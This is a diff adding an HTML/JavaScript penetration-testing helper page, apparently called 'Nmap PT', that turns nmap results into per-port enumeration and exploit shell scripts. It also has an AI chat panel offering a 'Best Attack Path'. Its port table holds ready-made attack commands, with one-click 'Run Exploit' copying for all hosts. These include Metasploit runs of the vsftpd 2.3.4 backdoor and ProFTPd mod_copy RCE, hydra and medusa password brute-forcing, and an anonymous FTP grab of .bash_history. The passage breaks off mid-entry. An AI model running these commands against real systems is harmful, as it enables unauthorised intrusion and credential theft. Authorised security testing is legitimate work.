@@ -1,0 +1,2876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Nmap PT — AA-VAPT</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#f8fafc;--bg2:#ffffff;--bg3:#f0f3f7;--bg4:#eef2f6;--bg5:#e6ebf0;
+  --border:#d0d7de;--border2:#c2c9d1;
+  --text:#1f2328;--text2:#3d4651;--text3:#5a6470;
+  --accent:#00879b;--accent2:#0a7ea4;
+  --green:#1a7f37;--red:#cf222e;--orange:#bc4c00;--yellow:#9a6700;--blue:#0a7ea4;--purple:#8250df;
+}
+html,body{height:100%;overflow:hidden}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);display:flex;flex-direction:column}
+
+/* ── NAV ── */
+.nav{display:flex;align-items:center;gap:10px;padding:0 16px;height:44px;background:#152a3a;color:#e8eef4;border-bottom:1px solid var(--border);flex-shrink:0}
+.nav .nav-brand,.nav .nav-title{color:#e8eef4 !important}
+.nav .nav-link{color:#aebfcf}
+.nav-brand{font-size:13px;font-weight:700;color:var(--text3);letter-spacing:.5px}
+.nav-sep{color:var(--border2);margin:0 2px}
+.nav-title{font-size:13px;font-weight:600;color:var(--text)}
+.nav-spacer{flex:1}
+.nav-link{font-size:11px;color:var(--text3);cursor:pointer;padding:3px 8px;border-radius:4px;border:1px solid transparent;text-decoration:none}
+.nav-link:hover{background:var(--bg4);border-color:var(--border);color:var(--text2)}
+.nav-badge{background:var(--accent);color:#fff;font-size:10px;font-weight:700;padding:2px 7px;border-radius:10px}
+
+/* ── MAIN 3-COL GRID ── */
+.main{display:grid;grid-template-columns:270px 260px 1fr;flex:1;overflow:hidden}
+
+/* ── LEFT PANEL ── */
+.lpanel{background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.lpanel-body{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px}
+.section-label{font-size:10px;font-weight:700;letter-spacing:.8px;color:var(--text3);text-transform:uppercase;margin-bottom:4px}
+
+/* Upload zone */
+.upload-zone{border:2px dashed var(--border2);border-radius:8px;padding:14px;text-align:center;cursor:pointer;transition:.2s}
+.upload-zone:hover,.upload-zone.drag{border-color:var(--accent);background:rgba(124,108,255,.04)}
+.upload-zone input{display:none}
+.uz-icon{font-size:20px;margin-bottom:4px}
+.uz-label{font-size:11px;color:var(--text3)}.uz-label span{color:var(--accent);font-weight:600}
+.uz-hint{font-size:10px;color:var(--text3);opacity:.5;margin-top:3px}
+.uz-btns{display:flex;gap:5px;justify-content:center;margin-top:8px}
+.uz-ok{font-size:10px;font-weight:600;margin-top:6px;min-height:14px}
+
+/* Textarea */
+textarea{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:6px;padding:8px;color:var(--text2);font-family:monospace;font-size:11px;resize:vertical;line-height:1.5;min-height:90px}
+textarea:focus{outline:none;border-color:var(--accent)}
+
+/* Fields */
+.field-row{display:flex;gap:6px}
+.field{flex:1;display:flex;flex-direction:column;gap:3px}
+.slabel{font-size:10px;color:var(--text3);font-weight:600}
+input[type=text]{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:5px;padding:5px 8px;color:var(--text2);font-size:11px}
+input[type=text]:focus{outline:none;border-color:var(--accent)}
+
+/* Checkboxes */
+.opt-grid{display:grid;grid-template-columns:1fr 1fr;gap:3px}
+.opt-row{display:flex;align-items:center;gap:5px;font-size:10px;color:var(--text3);cursor:pointer}
+.opt-row input[type=checkbox]{width:12px;height:12px;cursor:pointer}
+
+/* Buttons */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:4px;border-radius:5px;font-size:11px;font-weight:600;cursor:pointer;border:1px solid;transition:.15s;padding:5px 10px;white-space:nowrap}
+.btn-primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn-primary:hover{background:#6b5ce7}
+.btn-secondary{background:var(--bg4);color:var(--text2);border-color:var(--border2)}
+.btn-secondary:hover{border-color:var(--accent);color:var(--text)}
+.btn-sm{padding:3px 8px;font-size:10px}
+.btn-ghost{background:transparent;color:var(--text3);border-color:transparent}
+.btn-ghost:hover{background:var(--bg4);border-color:var(--border);color:var(--text2)}
+.btn-row{display:flex;gap:6px;flex-wrap:wrap}
+.btn-dl{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)}
+.btn-dl:hover{background:rgba(34,197,94,.15)}
+.btn-run{background:rgba(124,108,255,.08);color:#a78bfa;border-color:rgba(124,108,255,.3)}
+.btn-run:hover{background:rgba(124,108,255,.18)}
+.btn-xpl{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)}
+.btn-xpl:hover{background:rgba(239,68,68,.15)}
+.btn-zip{background:rgba(79,195,247,.08);color:var(--blue);border-color:rgba(79,195,247,.25)}
+.btn-zip:hover{background:rgba(79,195,247,.15)}
+
+/* Host list */
+.host-list{display:flex;flex-direction:column;gap:3px}
+.hchip{background:var(--bg4);border:1px solid var(--border2);border-radius:6px;padding:7px 10px;display:flex;align-items:center;gap:7px;cursor:pointer;transition:.15s}
+.hchip:hover{border-color:rgba(124,108,255,.4)}
+.hchip.active{border-color:var(--accent);background:rgba(124,108,255,.1)}
+.hchip-ip{font-size:12px;font-family:monospace;color:var(--accent2);font-weight:700;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hchip-cnt{font-size:10px;color:var(--green);background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.2);padding:1px 6px;border-radius:4px;flex-shrink:0}
+.hchip-svc{font-size:10px;color:var(--text3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:80px}
+
+/* Analyze btn */
+.analyze-btn{display:flex;align-items:center;gap:6px;padding:8px 12px;border:1px solid rgba(168,85,247,.3);border-radius:6px;background:rgba(168,85,247,.06);color:var(--purple);font-size:11px;font-weight:600;cursor:pointer;transition:.15s}
+.analyze-btn:hover{background:rgba(168,85,247,.12);border-color:rgba(168,85,247,.5)}
+
+/* ── MIDDLE PANEL (port list) ── */
+.mpanel{background:var(--bg);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.mpanel-head{padding:8px 12px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;font-weight:700;color:var(--text3);letter-spacing:.8px;text-transform:uppercase;flex-shrink:0;display:flex;align-items:center;gap:8px}
+.mpanel-body{flex:1;overflow-y:auto;padding:8px}
+.port-item{display:flex;align-items:center;gap:7px;padding:7px 10px;border-radius:6px;cursor:pointer;border:1px solid transparent;margin-bottom:3px;transition:.15s}
+.port-item:hover{background:var(--bg3);border-color:var(--border)}
+.port-item.active{background:var(--bg4);border-color:var(--border2)}
+.port-badge{font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;border:1px solid;white-space:nowrap;flex-shrink:0}
+.port-svc{font-size:11px;color:var(--text2);font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.port-risk{font-size:9px;font-weight:700;padding:1px 5px;border-radius:3px;flex-shrink:0}
+.empty-mid{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px;color:var(--text3)}
+.empty-mid-ico{font-size:36px;opacity:.12}
+.empty-mid-t{font-size:12px}
+
+/* ── RIGHT PANEL (scripts) ── */
+.rpanel{display:flex;flex-direction:column;overflow:hidden}
+.rtool{display:flex;align-items:center;gap:6px;padding:6px 12px;background:var(--bg3);border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap;row-gap:4px}
+.mode-tabs{display:flex;gap:3px}
+.mtab{padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;border:1px solid var(--border2);color:var(--text3);background:var(--bg4);font-weight:600;transition:.15s}
+.mtab:hover{color:var(--text2);border-color:var(--border2)}
+.mtab.active-enum{background:var(--green);color:#000;border-color:var(--green)}
+.mtab.active-xpl{background:var(--red);color:#fff;border-color:var(--red)}
+.mtab.active-sum{background:var(--blue);color:#000;border-color:var(--blue)}
+.mtab.active-az{background:var(--purple);color:#fff;border-color:var(--purple)}
+.mtab.active-ai{background:#f59e0b;color:#000;border-color:#f59e0b}
+.rsp{flex:1}
+.statsbar{display:flex;gap:12px;padding:5px 12px;background:var(--bg2);border-bottom:1px solid var(--border);font-size:10px;color:var(--text3);flex-shrink:0}
+.stat-v{color:var(--text);font-weight:700}
+.script-out{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px}
+
+/* Script blocks */
+.tblock{background:#152a3a;border:1px solid var(--border);border-radius:8px;overflow:hidden;flex-shrink:0}
+.tblock-head{display:flex;align-items:center;flex-wrap:wrap;gap:6px;padding:7px 12px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.tport{font-size:11px;font-weight:700;padding:2px 8px;border-radius:4px;border:1px solid;white-space:nowrap}
+.tsvc{font-size:11px;color:var(--text);font-weight:600}
+.trisk{font-size:10px;font-weight:700;padding:2px 6px;border-radius:3px}
+.tactions{margin-left:auto;display:flex;gap:5px;align-items:center}
+pre.term{padding:12px;font-family:'Consolas','Courier New',monospace;font-size:11px;line-height:1.8;white-space:pre;overflow-x:auto;overflow-y:auto;max-height:420px;color:#cfd8dc;margin:0;tab-size:4}
+pre.term .c{color:#455a64}
+pre.term .h{color:#80deea;font-weight:bold}
+pre.term .g{color:#a5d6a7}
+pre.term .p{color:#f59e0b;font-weight:bold}
+pre.term .r{color:#cf222e}
+pre.term .b{color:#90caf9}
+
+/* Summary & Analyze */
+.sum-table{width:100%;border-collapse:collapse;font-size:11px}
+.sum-table th{background:var(--bg3);color:var(--text3);font-size:10px;font-weight:700;text-transform:uppercase;padding:6px 10px;border-bottom:1px solid var(--border);text-align:left}
+.sum-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top}
+.sum-table tr:hover td{background:var(--bg3)}
+
+/* Scrollbar */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--text3)}
+
+/* Subtabs (all mode) */
+.subtabs{display:flex;gap:3px;margin-left:auto}
+.subtab{padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer;border:1px solid var(--border2);color:var(--text3);background:var(--bg4);font-weight:600}
+.subtab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+
+/* ── SETTINGS MODAL ── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1000;display:flex;align-items:center;justify-content:center}
+.modal-overlay.hidden{display:none}
+.modal{background:var(--bg3);border:1px solid var(--border2);border-radius:10px;width:480px;max-width:96vw;max-height:85vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.modal-hd{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);font-weight:700;font-size:13px}
+.modal-body{padding:18px;display:flex;flex-direction:column;gap:14px}
+.modal-section{background:var(--bg4);border:1px solid var(--border);border-radius:7px;padding:12px 14px;display:flex;flex-direction:column;gap:9px}
+.modal-section-title{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.05em;margin-bottom:2px}
+.field-row{display:flex;flex-direction:column;gap:4px}
+.field-label{font-size:10px;color:var(--text3);font-weight:600}
+.field-input{background:var(--bg2);border:1px solid var(--border);border-radius:5px;padding:6px 10px;font-size:11px;color:var(--text);font-family:monospace;width:100%}
+.field-input:focus{outline:none;border-color:var(--accent)}
+.field-hint{font-size:9px;color:var(--text3);opacity:.7}
+.modal-status{font-size:11px;padding:4px 0;min-height:18px}
+
+/* ── AI CHAT PANEL ── */
+.ai-panel{display:flex;flex-direction:column;height:100%;gap:0}
+.ai-actions{display:flex;flex-wrap:wrap;gap:5px;padding:10px 12px;border-bottom:1px solid var(--border);flex-shrink:0}
+.ai-msgs{flex:1;overflow-y:auto;padding:10px 12px;display:flex;flex-direction:column;gap:8px;min-height:0}
+.ai-msg{padding:8px 10px;border-radius:7px;font-size:11px;line-height:1.6;max-width:100%;word-break:break-word;white-space:pre-wrap}
+.ai-msg.user{background:rgba(124,108,255,.12);border:1px solid rgba(124,108,255,.2);color:var(--text);align-self:flex-end;max-width:85%}
+.ai-msg.ai{background:var(--bg3);border:1px solid var(--border);color:var(--text2);align-self:flex-start}
+.ai-msg.system{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);color:#86efac;font-size:10px;font-style:italic}
+.ai-msg.err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#cf222e}
+.ai-input-row{display:flex;gap:6px;padding:8px 12px;border-top:1px solid var(--border);flex-shrink:0}
+.ai-input{flex:1;background:var(--bg2);border:1px solid var(--border);border-radius:5px;padding:6px 10px;font-size:11px;color:var(--text);resize:none;height:34px;font-family:inherit}
+.ai-input:focus{outline:none;border-color:var(--accent)}
+
+/* ── CVE BADGE ── */
+.cve-btn{font-size:9px;padding:1px 5px;border-radius:3px;border:1px solid rgba(79,195,247,.3);color:#0a7ea4;background:rgba(79,195,247,.06);cursor:pointer;font-weight:600}
+.cve-btn:hover{background:rgba(79,195,247,.15)}
+.cve-panel{padding:8px 12px;background:rgba(79,195,247,.04);border-top:1px solid var(--border);font-size:10px;display:flex;flex-direction:column;gap:4px}
+.cve-item{display:flex;gap:6px;align-items:flex-start}
+.cve-id{color:#0a7ea4;font-weight:700;white-space:nowrap;font-family:monospace}
+.cve-desc{color:var(--text2);line-height:1.4}
+.cve-sev{font-size:9px;font-weight:700;padding:0 4px;border-radius:2px;flex-shrink:0}
+
+/* ── SCAN HISTORY ── */
+.hist-btn{font-size:10px;padding:2px 8px;border-radius:4px;border:1px solid var(--border2);background:var(--bg4);color:var(--text3);cursor:pointer}
+.hist-btn:hover{border-color:var(--accent);color:var(--text)}
+.hist-drop{position:absolute;top:100%;left:0;right:0;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;z-index:100;max-height:200px;overflow-y:auto;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.hist-item{padding:7px 10px;cursor:pointer;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:2px}
+.hist-item:hover{background:var(--bg4)}
+.hist-item:last-child{border-bottom:none}
+.hist-name{font-size:11px;color:var(--text);font-weight:600}
+.hist-meta{font-size:9px;color:var(--text3)}
+
+/* ── SHODAN PANEL ── */
+.shodan-panel{background:var(--bg3);border:1px solid #f59e0b44;border-radius:7px;padding:10px 12px;font-size:10px;display:flex;flex-direction:column;gap:5px;margin-top:4px}
+.shodan-title{font-size:11px;font-weight:700;color:#f59e0b;margin-bottom:2px}
+.shodan-row{display:flex;gap:8px;color:var(--text2)}
+.shodan-k{color:var(--text3);min-width:70px}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav">
+  <span class="nav-brand">AA-VAPT</span>
+  <span class="nav-sep">|</span>
+  <span style="font-size:14px">🗺</span>
+  <span class="nav-title">Nmap PT</span>
+  <div class="nav-spacer"></div>
+  <a class="nav-link" href="nessus-analyzer.html">Nessus</a>
+  <a class="nav-link" href="webapp-pt.html">WebApp PT</a>
+  <span class="nav-badge">v3</span>
+  <button class="nav-link" onclick="openSettings()" title="AI & API Settings" style="border:none;background:none;cursor:pointer;font-size:13px">⚙️</button>
+</nav>
+
+<!-- ── SETTINGS MODAL ── -->
+<div class="modal-overlay hidden" id="settingsModal" onclick="if(event.target===this)closeSettings()">
+  <div class="modal">
+    <div class="modal-hd">
+      <span>⚙️ Settings — AI & API Keys</span>
+      <button class="btn btn-secondary btn-sm" onclick="closeSettings()">✕</button>
+    </div>
+    <div class="modal-body">
+
+      <!-- Ollama -->
+      <div class="modal-section">
+        <div class="modal-section-title">🤖 Ollama (Local AI)</div>
+        <div class="field-row">
+          <div class="field-label">Ollama URL</div>
+          <input class="field-input" id="cfg_ollamaUrl" value="http://localhost:11434" placeholder="http://localhost:11434">
+          <div class="field-hint">Default: http://localhost:11434 — make sure Ollama is running</div>
+        </div>
+        <div class="field-row">
+          <div class="field-label">Model Name</div>
+          <input class="field-input" id="cfg_ollamaModel" value="" placeholder="e.g. deepseek-r1 / llama3 / mistral">
+          <div class="field-hint">Run <code style="color:var(--accent2)">ollama list</code> to see installed models. Click "List Models" below.</div>
+        </div>
+        <div style="display:flex;gap:6px">
+          <button class="btn btn-secondary btn-sm" onclick="testOllama()">🔌 Test Connection</button>
+          <button class="btn btn-dl btn-sm" onclick="listOllamaModels()">📋 List Models</button>
+        </div>
+        <div class="modal-status" id="ollamaStatus"></div>
+      </div>
+
+      <!-- Shodan -->
+      <div class="modal-section">
+        <div class="modal-section-title">🔍 Shodan API</div>
+        <div class="field-row">
+          <div class="field-label">Shodan API Key</div>
+          <input class="field-input" id="cfg_shodanKey" type="password" placeholder="your-shodan-api-key">
+          <div class="field-hint">Get free key at <a href="https://account.shodan.io" target="_blank" style="color:var(--accent2)">account.shodan.io</a></div>
+        </div>
+      </div>
+
+      <!-- NVD -->
+      <div class="modal-section">
+        <div class="modal-section-title">🛡 NVD / CVE API</div>
+        <div class="field-row">
+          <div class="field-label">NVD API Key (optional)</div>
+          <input class="field-input" id="cfg_nvdKey" placeholder="nvd-api-key (optional — free tier works without)">
+          <div class="field-hint">Without key: 5 req/30s. With key: 50 req/30s. Get at <a href="https://nvd.nist.gov/developers/request-an-api-key" target="_blank" style="color:var(--accent2)">nvd.nist.gov</a></div>
+        </div>
+      </div>
+
+      <button class="btn btn-primary btn-sm" style="width:100%;padding:8px" onclick="saveSettings()">💾 Save Settings</button>
+    </div>
+  </div>
+</div>
+
+<!-- 3-COLUMN MAIN -->
+<div class="main">
+
+  <!-- ── LEFT: Input + Hosts ── -->
+  <div class="lpanel">
+    <div class="lpanel-body">
+
+      <div>
+        <div class="section-label">Upload</div>
+        <div class="upload-zone" id="upZone">
+          <input type="file" id="fileIn" accept=".txt,.nmap,.gnmap,.xml,.log,.out,.docx" multiple onchange="handleFiles(this.files)">
+          <input type="file" id="folderIn" webkitdirectory multiple onchange="handleFiles(this.files)">
+          <div class="uz-icon">📂</div>
+          <div class="uz-label"><span>Drag & drop</span> files or folder</div>
+          <div class="uz-hint">.txt · .nmap · .gnmap · .xml</div>
+          <div class="uz-btns">
+            <button class="btn btn-secondary btn-sm" onclick="document.getElementById('fileIn').click()">📄 Files</button>
+            <button class="btn btn-secondary btn-sm" onclick="document.getElementById('folderIn').click()">📁 Folder</button>
+          </div>
+          <div class="uz-ok" id="uploadOk"></div>
+        </div>
+      </div>
+
+      <div style="text-align:center;font-size:10px;color:var(--text3)">— or paste nmap output —</div>
+
+      <div>
+        <textarea id="nmapIn" placeholder="Nmap scan report for 192.168.1.1&#10;80/tcp  open  http&#10;443/tcp open  https&#10;22/tcp  open  ssh&#10;&#10;Or compact: 192.168.1.1:80/tcp/http,443/tcp/https"></textarea>
+      </div>
+
+      <div class="field-row">
+        <div class="field">
+          <div class="slabel">Override IP</div>
+          <input type="text" id="ipOverride" placeholder="auto-detect">
+        </div>
+        <div class="field">
+          <div class="slabel">Output Dir</div>
+          <input type="text" id="outDir" value="./results">
+        </div>
+      </div>
+
+      <div class="field">
+        <div class="slabel">Wordlist</div>
+        <input type="text" id="wordlist" value="/usr/share/wordlists/dirb/common.txt">
+      </div>
+
+      <div>
+        <div class="slabel" style="margin-bottom:5px">Options</div>
+        <div class="opt-grid">
+          <label class="opt-row"><input type="checkbox" id="optBrute" checked> Brute-force</label>
+          <label class="opt-row"><input type="checkbox" id="optMSF" checked> Metasploit</label>
+          <label class="opt-row"><input type="checkbox" id="optNSE" checked> NSE scripts</label>
+          <label class="opt-row"><input type="checkbox" id="optSkipRPC" checked> Skip RPC</label>
+        </div>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn btn-primary" style="flex:1" onclick="runGenerate()">⚡ Generate Scripts</button>
+        <button class="btn btn-secondary btn-sm" onclick="clearAll()">✕ Clear</button>
+      </div>
+
+      <!-- Scan History -->
+      <div id="histWrap" style="position:relative;margin-bottom:6px">
+        <div style="display:flex;gap:4px;align-items:center">
+          <button class="hist-btn" style="flex:1;text-align:left" onclick="toggleHistDrop()">🕐 Scan History <span id="histCount" style="color:var(--accent2)"></span></button>
+          <button class="btn btn-secondary btn-sm" onclick="saveCurrentScan()" title="Save current scan to history">💾</button>
+        </div>
+        <div class="hist-drop hidden" id="histDrop"></div>
+      </div>
+
+      <!-- Host list -->
+      <div id="hostListWrap" style="display:none">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:5px">
+          <div class="section-label" style="margin:0">Hosts <span id="hostCountBadge" style="color:var(--green)"></span></div>
+          <div style="display:flex;gap:4px">
+            <button class="btn btn-dl btn-sm" onclick="downloadAllZip()">📦 ZIP</button>
+            <button class="btn btn-sm btn-secondary" onclick="downloadMasterScript('enum')">⬇ Enum.sh</button>
+            <button class="btn btn-xpl btn-sm" onclick="downloadMasterScript('xpl')">⬇ Exploit.sh</button>
+          </div>
+        </div>
+        <div class="host-list" id="hostList"></div>
+      </div>
+
+      <!-- Master Script Run buttons -->
+      <div id="masterBtns" style="display:none;flex-direction:column;gap:5px;margin-top:6px">
+        <div style="font-size:10px;color:var(--text3);font-weight:600;letter-spacing:.05em">MASTER SCRIPTS (ALL HOSTS)</div>
+        <div style="display:flex;gap:5px">
+          <button class="btn btn-dl btn-sm" style="flex:1" onclick="cpMasterRun('enum',this)" title="Copy heredoc → paste in terminal → runs all enum commands for all hosts">▶ Run Enum</button>
+          <button class="btn btn-xpl btn-sm" style="flex:1" onclick="cpMasterRun('xpl',this)" title="Copy heredoc → paste in terminal → runs all exploit commands for all hosts">▶ Run Exploit</button>
+        </div>
+        <div style="font-size:9px;color:var(--text3);opacity:.7">▶ Run = copy heredoc, paste in terminal, no file needed</div>
+        <button class="btn btn-secondary btn-sm" style="width:100%;font-size:10px" onclick="setMode('summary')">📊 Preview in Summary tab</button>
+      </div>
+
+      <button class="analyze-btn" onclick="setMode('analyze')">🔬 Analyze Output Files</button>
+
+    </div>
+  </div>
+
+  <!-- ── MIDDLE: Port list ── -->
+  <div class="mpanel">
+    <div class="mpanel-head">
+      <span>Ports</span>
+      <span id="portHostLabel" style="color:var(--accent2);font-weight:700;font-size:11px;text-transform:none;letter-spacing:0"></span>
+      <span id="portCount" style="color:var(--green);margin-left:auto"></span>
+    </div>
+    <div class="mpanel-body" id="portList">
+      <div class="empty-mid">
+        <div class="empty-mid-ico">🔌</div>
+        <div class="empty-mid-t">Select a host</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── RIGHT: Scripts ── -->
+  <div class="rpanel">
+    <div class="rtool" id="rtool" style="display:none">
+      <div class="mode-tabs">
+        <div class="mtab" id="tabEnum" onclick="setMode('enum')">🔍 ENUM</div>
+        <div class="mtab" id="tabXpl"  onclick="setMode('xpl')">💥 EXPLOIT</div>
+        <div class="mtab" id="tabSum"  onclick="setMode('summary')">📊 Summary</div>
+        <div class="mtab" id="tabAz"   onclick="setMode('analyze')" style="color:var(--purple)">🔬 Analyze</div>
+        <div class="mtab" id="tabAI"   onclick="setMode('ai')" style="color:#f59e0b">🤖 AI</div>
+      </div>
+      <div class="rsp"></div>
+      <button class="btn btn-dl btn-sm" onclick="downloadSelectedEnum()">⬇ Enum.sh</button>
+      <button class="btn btn-xpl btn-sm" onclick="downloadSelectedExploit()">⬇ Exploit.sh</button>
+    </div>
+    <div class="statsbar" id="statsbar" style="display:none">
+      <span>Hosts: <span class="stat-v" id="stHosts">0</span></span>
+      <span>Ports: <span class="stat-v" id="stPorts">0</span></span>
+      <span>Enum: <span class="stat-v" id="stEnum">0</span></span>
+      <span>Exploit: <span class="stat-v" id="stXpl">0</span></span>
+      <span>RPC skipped: <span class="stat-v" id="stSkip">0</span></span>
+    </div>
+    <div class="script-out" id="scriptOut">
+      <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:var(--text3)">
+        <div style="font-size:48px;opacity:.1">📡</div>
+        <div style="font-size:13px">Upload a file or paste nmap output, then Generate</div>
+        <div style="font-size:11px;opacity:.6">Generates per-port enum + exploit scripts</div>
+      </div>
+    </div>
+
+    <!-- AI PANEL (hidden until AI tab selected) -->
+    <div class="ai-panel" id="aiPanel" style="display:none">
+      <div class="ai-actions">
+        <button class="btn btn-secondary btn-sm" onclick="aiAnalyzeAll()">🔍 Analyze Findings</button>
+        <button class="btn btn-secondary btn-sm" onclick="aiAttackPath()">🎯 Best Attack Path</button>
+        <button class="btn btn-secondary btn-sm" onclick="aiGenerateReport()">📝 AI Report</button>
+        <button class="btn btn-secondary btn-sm" onclick="aiExplainHost()">💡 Explain Host</button>
+        <button class="btn btn-secondary btn-sm" style="margin-left:auto;color:var(--text3)" onclick="aiClearChat()">🗑 Clear</button>
+      </div>
+      <div class="ai-msgs" id="aiMsgs">
+        <div class="ai-msg system">🤖 AI powered by Ollama (local). Configure model in ⚙️ Settings.<br>Select a host then ask anything about the scan.</div>
+      </div>
+      <div class="ai-input-row">
+        <textarea class="ai-input" id="aiInput" placeholder="Ask AI about this scan… e.g. 'What is the highest risk port?'" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();aiSend()}"></textarea>
+        <button class="btn btn-primary btn-sm" onclick="aiSend()" style="padding:0 12px">▶</button>
+      </div>
+    </div>
+  </div>
+
+</div><!-- .main -->
+
+<script>
+const PORT_DB = {
+  21: { name:'FTP', color:'#f59e0b', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=ftp-anon,ftp-syst,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p {PORT} {IP} -oN {OUTDIR}/ftp_{PORT}_nmap.txt',
+      '# Anonymous login test',
+      'ftp -n {IP} {PORT} <<EOF\nuser anonymous anonymous\nls -la\nbinary\nget .bash_history\nquit\nEOF',
+      '# Brute-force FTP credentials',
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP}:{PORT} -t 4 -vV 2>&1 | tee {OUTDIR}/ftp_{PORT}_hydra.txt',
+    ],
+    exploit:[
+      '# vsftpd 2.3.4 backdoor (CVE-2011-2523)',
+      'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# ProFTPd 1.3.5 mod_copy RCE (CVE-2015-3306)',
+      'msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {IP}; set RPORT {PORT}; set SITEPATH /var/www/html; run"',
+      '# FTP bounce attack via nmap',
+      'nmap -b {IP}:{PORT} -Pn -p 21,22,80,443 10.0.0.1-254',
+    ],
+    msf:['exploit/unix/ftp/vsftpd_234_backdoor','exploit/unix/ftp/proftpd_modcopy_exec']
+  },
+
+  22: { name:'SSH', color:'#1a7f37', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos,ssh-run -p {PORT} {IP} -oN {OUTDIR}/ssh_{PORT}_nmap.txt',
+      'ssh-audit {IP}:{PORT} 2>&1 | tee {OUTDIR}/ssh_{PORT}_audit.txt',
+      'ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p {PORT} {IP} 2>&1 | tee {OUTDIR}/ssh_{PORT}_keys.txt',
+      '# Check for username enumeration',
+      'ssh -o "StrictHostKeyChecking=no" -p {PORT} root@{IP} 2>&1 | head -5',
+    ],
+    exploit:[
+      '# Brute-force SSH',
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP}:{PORT} -t 4 -vV 2>&1 | tee {OUTDIR}/ssh_{PORT}_hydra.txt',
+      '# Medusa SSH brute',
+      'medusa -h {IP} -n {PORT} -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -M ssh -f',
+      '# Default credentials',
+      'hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://{IP}:{PORT} -t 4',
+    ],
+    msf:['auxiliary/scanner/ssh/ssh_login','auxiliary/scanner/ssh/ssh_enumusers']
+  },
+
+  23: { name:'Telnet', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=telnet-ntlm-info,telnet-encryption -p {PORT} {IP} -oN {OUTDIR}/telnet_{PORT}_nmap.txt',
+      '# Banner grab',
+      'nc -nv {IP} {PORT} </dev/null 2>&1 | head -10',
+      'timeout 5 telnet {IP} {PORT} 2>&1',
+    ],
+    exploit:[
+      '# Brute-force Telnet',
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt telnet://{IP}:{PORT} -t 4 -vV 2>&1 | tee {OUTDIR}/telnet_{PORT}_hydra.txt',
+      '# Default credentials',
+      'hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://{IP}:{PORT}',
+    ],
+    msf:['auxiliary/scanner/telnet/telnet_login','auxiliary/scanner/telnet/bsdi_telnet_backdoor']
+  },
+
+  25: { name:'SMTP', color:'#f59e0b', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-enum-users -p {PORT} {IP} -oN {OUTDIR}/smtp_{PORT}_nmap.txt',
+      '# User enumeration VRFY/EXPN',
